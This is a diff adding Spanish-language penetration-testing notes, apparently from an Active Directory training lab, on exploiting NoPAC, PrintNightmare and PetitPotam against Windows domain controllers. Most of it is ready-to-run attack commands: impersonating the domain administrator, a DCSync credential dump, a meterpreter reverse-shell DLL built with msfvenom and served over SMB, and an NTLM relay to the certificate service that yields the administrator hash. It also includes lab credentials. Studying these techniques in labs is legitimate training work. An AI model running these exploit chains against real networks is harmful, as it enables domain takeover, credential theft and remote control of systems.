@@ -146,3 +146,72 @@ Flags interesantes
 -user-status
 #Nos permite saber si el usuario esta habilitado
 
+----------  ----------  ----------  ----------
+	###Bliding eye
+Vulnerabilidades criticas ya parcheadas recientemente pero que pueden no estar parcheadas en todos los casos
+----------
+	### NoPAC / SAMAccount name spoofing
+CVE 2021-42278 y 2021-42287
+Este ataque consta de agregar una computador de dominio con el nombre (SAMAccount name) del DC. Esto genera que al solicitar kerberos tickets, se nos proporcionen bajo el nombre del DC.
+
+git clone https://github.com/SecureAuthCorp/impacket.git
+python setup.py install 
+git clone https://github.com/Ridter/noPac.git
+#Este ultimo es el tool para explotar la vulnerabilidad. EL repo anterior es de impacket, solo para estar seguros de que esta instalado puesto que nopac lo utiliza.
+
+sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
+#Scaneamos el target conectandonos con un usuario valido y especificando la ip.
+#Nos obtiene el tgt
+
+sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
+#Impersonar al administrador local. Puede ser ruidoso.
+#Es una shell semi interactiva mediante smbexec.py de impacket
+
+sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
+#Ataque DCSync con nopac
+
+----------
+	### Print Nightmare
+CVE-2021-34527 and CVE-2021-1675
+Vulnerabilidad que esplota el servicio Print Spooler que corre en todos los windows.
+
+git clone https://github.com/cube0x0/CVE-2021-1675.git
+#Clonacion del exploit
+
+pip3 uninstall impacket
+git clone https://github.com/cube0x0/impacket
+cd impacket
+python3 ./setup.py install
+#Posiblemente haya que usar la version cube0x0 de impacket y desintalar la otra.
+
+rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
+#Verificar si Print System Asynchronous Protocol and Print System Remote Protocol estan expuestos en el target
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
+#Creacion de DLL para usar el exploit
+sudo smbserver.py -smb2support CompData ./backupscript.dll
+#Comparto el dll mediante smb
+
+sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
+#Corro el exploit
+
+----------
+	### PetitPotam
+CVE-2021-36942
+Vulnerabilidad LSA spoofing. Obliga al DC a autenticarse mediante 445 usando NTLM mediante LSARPC.
+
+sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
+#Comienza servidor
+
+git clone https://github.com/topotam/PetitPotam.git
+#Clonacion del tool
+python3 PetitPotam.py 172.16.5.225 172.16.5.5
+#Explotar vuln
+
+python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <base64 cert> dc01.ccache
+#Usando el certificado que genera el exploit obtengo el TGT
+
+export KRB5CCNAME=dc01.ccache
+secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+#Me devuelve el NTLM
+
